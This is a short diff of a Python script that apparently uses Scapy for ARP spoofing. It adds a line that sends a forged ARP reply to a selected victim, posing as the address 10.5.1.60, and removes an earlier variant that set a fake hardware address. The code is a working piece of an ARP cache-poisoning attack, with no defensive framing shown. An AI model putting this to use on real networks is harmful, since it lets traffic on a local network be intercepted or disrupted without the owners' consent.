@@ -34,8 +34,9 @@ print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
 #except KeyboardInterrupt:
  #   pass
 
+packet = srp(ARP(op=2, pdst=(ip[victim-1]), hwdst=(mac[victim-1]),psrc="10.5.1.60"), verbose=0)
+    # Send previously created packet without output
 
-tovictim = srp(ARP(hwsrc = "pp:pp:pp:pp:pp:pp",op = 2,psrc="10.5.1.60", pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
 
     
     
